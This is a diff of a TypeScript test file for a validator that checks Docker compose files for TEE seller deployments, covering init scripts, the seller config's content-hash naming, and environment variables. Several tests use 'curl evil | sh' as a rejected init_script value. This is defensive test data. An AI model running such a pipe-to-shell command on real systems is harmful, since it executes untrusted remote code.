@@ -1,6 +1,6 @@
 import { describe, it, expect } from 'vitest'
 import { checkAppCompose } from './dstack-app-compose.js'
-import { TEST_IMAGE, appCompose, composeHash, referenceCompose, sellerConfig, withSellerConfig } from './dstack-build.fixture.js'
+import { TEST_IMAGE, appCompose, composeHash, referenceCompose, sellerConfig, withSellerConfig, withSellerConfigContent } from './dstack-build.fixture.js'
 
 type Obj = Record<string, any>
 
@@ -37,6 +37,14 @@ describe('checkAppCompose', () => {
     expect(checkAppCompose(app, composeHash(app + ' '), [TEST_IMAGE])).toEqual({ error: 'app compose does not match the measured compose hash' })
   })
 
+  it('accepts the ACI adapter with its attestation URL as a literal provider setting', () => {
+    const compose = withService((s) => {
+      s['environment']['ANTSEED_VERIFIER_PROVIDER_ADAPTER'] = 'aci'
+      s['environment']['ANTSEED_VERIFIER_PROVIDER_ACI_URL'] = 'https://provider.example/v1/aci/attestation'
+    })
+    expect(checkCompose(compose)).not.toHaveProperty('error')
+  })
+
   it('rejects an image that is not an approved Antseed image', () => {
     expect(checkAppCompose(appCompose(referenceCompose()), composeHash(appCompose(referenceCompose())), [])).toMatchObject({ error: expect.stringMatching(/not an approved Antseed TEE seller image/) })
     expect(checkCompose(withService((s) => { s['image'] = 'ghcr.io/antseed/tee-seller:latest' }))).toMatchObject({ error: 'service image must be pinned by digest' })
@@ -52,7 +60,10 @@ describe('checkAppCompose', () => {
     expect(checkCompose(referenceCompose(), { public_logs: true })).not.toHaveProperty('error')
     // Phala Cloud sets it; it only stops the CVM from booting without the matching launch token.
     expect(checkCompose(referenceCompose(), { launch_token_hash: 'ab'.repeat(32) })).not.toHaveProperty('error')
-    expect(checkCompose(referenceCompose(), { init_script: ['curl evil | sh'] })).toMatchObject({ error: expect.stringMatching(/init_script is not allowed/) })
+    expect(checkCompose(referenceCompose(), { init_script: ['curl evil | sh'] })).toMatchObject({ error: expect.stringMatching(/init script/) })
+    expect(checkCompose(referenceCompose(), { init_script: 'curl evil | sh' })).toMatchObject({ error: expect.stringMatching(/init script/) })
+    // Phala Cloud's CLI always writes the key, empty when the app has no init scripts.
+    for (const empty of [[], '', null]) expect(checkCompose(referenceCompose(), { init_script: empty })).not.toHaveProperty('error')
     expect(checkCompose(referenceCompose(), { runner: 'bash', bash_script: 'x' })).toMatchObject({ error: expect.stringMatching(/bash_script is not allowed/) })
     expect(checkCompose(referenceCompose(), { runner: 'bash' })).toMatchObject({ error: expect.stringMatching(/docker compose/) })
   })
@@ -97,8 +108,7 @@ describe('checkAppCompose', () => {
   })
 
   it('rejects variables anywhere outside the environment, including the inline seller config', () => {
-    const compose = referenceCompose()
-    compose['configs']['seller-config']['content'] = compose['configs']['seller-config']['content'].replace('https://upstream.example', '${UPSTREAM}')
+    const compose = withSellerConfigContent(referenceCompose(), JSON.stringify(sellerConfig(referenceCompose())).replace('https://upstream.example', '${UPSTREAM}'))
     expect(checkCompose(compose)).toMatchObject({ error: expect.stringMatching(/outside the environment/) })
     expect(checkCompose(withService((s) => { s['ports'] = ['${PORT}:6882'] }))).toMatchObject({ error: expect.stringMatching(/outside the environment/) })
   })
@@ -113,10 +123,30 @@ describe('checkAppCompose', () => {
   })
 
   it('requires the seller config inline at the path the image reads', () => {
-    expect(checkCompose(withService((s) => { s['configs'] = [{ source: 'seller-config', target: '/tmp/config.json' }] }))).toMatchObject({ error: expect.stringMatching(/mounted at/) })
+    expect(checkCompose(withService((s) => { s['configs'] = [{ ...s['configs'][0], target: '/tmp/config.json' }] }))).toMatchObject({ error: expect.stringMatching(/mounted at/) })
     const file = referenceCompose()
-    file['configs']['seller-config'] = { file: './config.json' }
+    const [name] = Object.keys(file['configs'])
+    file['configs'][name] = { file: './config.json' }
     expect(checkCompose(file)).toMatchObject({ error: 'the seller config must be inline content' })
+  })
+
+  it('requires the seller config to be named after its full content hash, so a config change recreates the container', () => {
+    const named = (name: string): Obj => {
+      const compose = referenceCompose()
+      const [content] = Object.values(compose['configs']) as Obj[]
+      compose['services']['seller']['configs'][0]['source'] = name
+      compose['configs'] = { [name]: content }
+      return compose
+    }
+    const reference = referenceCompose()
+    const [name] = Object.keys(reference['configs'])
+    expect(name).toMatch(/^seller-config-[0-9a-f]{64}$/)
+    const error = { error: expect.stringMatching(/must be named seller-config-<SHA-256 of its content>/) }
+    // The fixed name compose used to write, a short hash prefix, and the name of a previous config.
+    expect(checkCompose(named('seller-config'))).toMatchObject(error)
+    expect(checkCompose(named(name.slice(0, 'seller-config-'.length + 12)))).toMatchObject(error)
+    const stale = withSellerConfig(reference, { ...sellerConfig(reference), identity: { displayName: 'other' } })
+    expect(checkCompose(named(Object.keys(stale['configs'])[0]))).toMatchObject(error)
   })
 
   it('lists every upstream, defaults included, and requires https', () => {
